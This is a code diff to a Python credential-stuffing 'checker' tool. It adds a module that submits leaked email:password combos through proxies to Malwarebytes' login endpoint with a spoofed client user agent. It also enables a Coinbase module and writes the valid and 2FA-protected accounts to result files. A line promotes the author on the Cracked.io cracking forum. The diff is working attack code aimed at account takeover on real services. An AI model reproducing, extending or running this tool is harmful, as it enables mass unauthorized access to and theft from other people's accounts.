@@ -18,6 +18,35 @@ except :
   system('pip install time')
   import time
   from time import sleep
+try :
+  with open("config.json") as config:
+    config = json.load(config)
+    log = config["log"]
+except:
+  print('Download the Config in https://raw.githubusercontent.com/bearbearteam/python-aio/main/config.json ! ')
+  time.sleep(5)
+  exit()
+
+def malwarebytes(combo,proxy):
+  
+  x,y = combo.split(":", 1)
+  headers = requests.utils.default_headers()
+  headers.update(
+      {
+          'User-Agent': 'MBAM/4.4.10.144 (build: 1.0.1499; Windows 10.0.19043)',
+      }
+  )
+  url = 'https://my-sso.malwarebytes.com/auth'
+  data ={"email": x, "password": y, "generate_holocron_token": 'true'}
+
+  r = requests.post(url, json=data, proxies=proxy,headers=headers)
+  if '"success":false' in r.text:
+    status = 'false'
+  elif '"success":true' in r.text:
+    status = 'true'
+  else :
+    status = 'false'
+  return status
 def coinbase(combo,proxy):
   
   x,y = combo.split(":", 1)
@@ -126,7 +155,7 @@ def proxy_loader(proxyfile):
   return proxies
 
 def combo_loader():
-  print('\nModules:\n1 : GeoGussr\n2 : Curiosity Stream\n3 : NordVPN\n4 : Picstart')
+  print('\nModules:\n1 : GeoGussr\n2 : Curiosity Stream\n3 : NordVPN\n4 : Picstart\n5 : Coinbase\n6 : malwarebytes')
   module = input('Please input module number : ')
   file = input(('Please input your combo file : '))
   file2 = input(('Please input your proxy file(Only Http) : '))
@@ -147,12 +176,17 @@ def combo_loader():
       output = nordvpn(x,proxyoutput)
     elif module == '4':
       output = picstart(x,proxyoutput)
+    elif module == '5':
+      output = coinbase(x,proxyoutput)
+    elif module == '6':
+      output = malwarebytes(x,proxyoutput)
     else:
       print('Bruh,Chose a Valid module')
       time.sleep(10)
       quit()
     if output == 'true' :
-      print('valid : '+ x ) 
+      if log == "1":
+        print('valid : '+ x ) 
       isdir = os.path.isdir('results')
       if isdir == False :
         os.mkdir('results')
@@ -160,15 +194,14 @@ def combo_loader():
       accountwrite = (x+'\n')
       f.write(accountwrite)
     elif output == '2fa':
-      print('2fa : '+ x ) 
+      if log == "1":
+        print('2fa : '+ x ) 
       isdir = os.path.isdir('results')
       if isdir == False :
         os.mkdir('results')
       f = open('results/2fa.txt','a+')
       accountwrite = (x+'\n')
       f.write(accountwrite)
-    elif output == 'false' : 
-      print('invalid ' + x) 
     else:
       print(output)
   return file
@@ -183,6 +216,6 @@ output = combo_loader()
 os.remove(output)
 e = open('Nothing.txt','a+')
 pogchamp = ('Rep me on Cracked.io! cracked.io/lamlucius8 !!!!! ')
-e.write()
+e.write(pogchamp)
 print('All valid accounts will be in results folder valid.txt')
 sleep(15)
